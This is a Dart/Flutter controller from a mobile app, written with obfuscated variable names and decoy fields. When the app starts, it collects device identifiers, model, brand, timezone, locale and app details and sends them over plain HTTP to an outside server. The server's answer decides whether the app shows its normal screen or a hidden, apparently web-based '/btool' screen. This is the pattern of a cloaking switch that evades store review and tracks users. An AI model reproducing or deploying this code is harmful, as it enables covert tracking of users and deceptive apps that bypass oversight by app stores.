import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var kodgpyez = RxBool(false);
  var ftijkwzbh = RxBool(true);
  var gxqlzr = RxString("");
  var abbey = RxBool(false);
  var greenholt = RxBool(true);
  final copikdhmrl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    nfpa();
  }


  Future<void> nfpa() async {

    abbey.value = true;
    greenholt.value = true;
    ftijkwzbh.value = false;

    copikdhmrl.post("http://yongai.vlo231.shop/suwiopbceqltjmr",data: await jpsdnaibf()).then((value) {
      var jauqvx = value.data["jauqvx"] as String;
      var usmwaq = value.data["usmwaq"] as bool;
      if (usmwaq) {
        gxqlzr.value = jauqvx;
        marilyne();
      } else {
        kassulke();
      }
    }).catchError((e) {
      ftijkwzbh.value = true;
      greenholt.value = true;
      abbey.value = false;
    });
  }

  Future<Map<String, dynamic>> jpsdnaibf() async {
    final DeviceInfoPlugin xoldnbz = DeviceInfoPlugin();
    PackageInfo xsioh_gfcah = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qtei = Platform.localeName;
    var pufhnb = currentTimeZone;

    var yupj = xsioh_gfcah.packageName;
    var kpzvyi = xsioh_gfcah.version;
    var fhlcdmv = xsioh_gfcah.buildNumber;

    var wdtnq = xsioh_gfcah.appName;
    var sebastianHessel = "";
    var gesvmdy = "";
    var vogd  = "";
    var lurzpsoy = "";
    var darrickGleichner = "";
    var ethylLeuschke = "";
    var chelsieLebsack = "";
    var nickMcDermott = "";
    var scarlettMitchell = "";
    var rachelKemmer = "";
    var donnaHermiston = "";


    var qdwa = "";
    var aredm = false;

    if (GetPlatform.isAndroid) {
      qdwa = "android";
      var hsmcdkqwny = await xoldnbz.androidInfo;

      lurzpsoy = hsmcdkqwny.brand;

      gesvmdy  = hsmcdkqwny.model;
      vogd = hsmcdkqwny.id;

      aredm = hsmcdkqwny.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qdwa = "ios";
      var solirhg = await xoldnbz.iosInfo;
      lurzpsoy = solirhg.name;
      gesvmdy = solirhg.model;

      vogd = solirhg.identifierForVendor ?? "";
      aredm  = solirhg.isPhysicalDevice;
    }
    var res = {
      "wdtnq": wdtnq,
      "fhlcdmv": fhlcdmv,
      "kpzvyi": kpzvyi,
      "gesvmdy": gesvmdy,
      "chelsieLebsack" : chelsieLebsack,
      "pufhnb": pufhnb,
      "lurzpsoy": lurzpsoy,
      "sebastianHessel" : sebastianHessel,
      "vogd": vogd,
      "yupj": yupj,
      "qdwa": qdwa,
      "aredm": aredm,
      "scarlettMitchell" : scarlettMitchell,
      "ethylLeuschke" : ethylLeuschke,
      "darrickGleichner" : darrickGleichner,
      "qtei": qtei,
      "nickMcDermott" : nickMcDermott,
      "rachelKemmer" : rachelKemmer,
      "donnaHermiston" : donnaHermiston,

    };
    return res;
  }

  Future<void> kassulke() async {
    Get.offAllNamed("/main");
  }

  Future<void> marilyne() async {
    Get.offAllNamed("/btool");
  }

}
